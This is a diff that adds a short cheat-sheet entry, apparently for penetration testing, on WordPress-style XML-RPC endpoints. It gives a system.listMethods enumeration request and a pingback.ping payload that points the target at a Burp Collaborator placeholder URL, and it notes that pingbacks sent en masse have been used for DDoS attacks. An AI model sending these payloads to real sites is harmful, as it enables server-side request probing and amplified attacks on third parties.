@@ -1,0 +1,15 @@
+- List Methods:
+  <methodCall>
+    <methodName>system.listMethods</methodName>
+    <params></params>
+  </methodCall>
+
+
+- Pingbacks (en masse can lead to DDOS attacks has been used in the wild):
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://YOUR_URL_COLLABORATOR_BURP:80</string></value>
+</param><param><value><string>https://DOMAIN.COM/VALID-BLOG-LINK</string>
+</value></param></params>
+</methodCall>
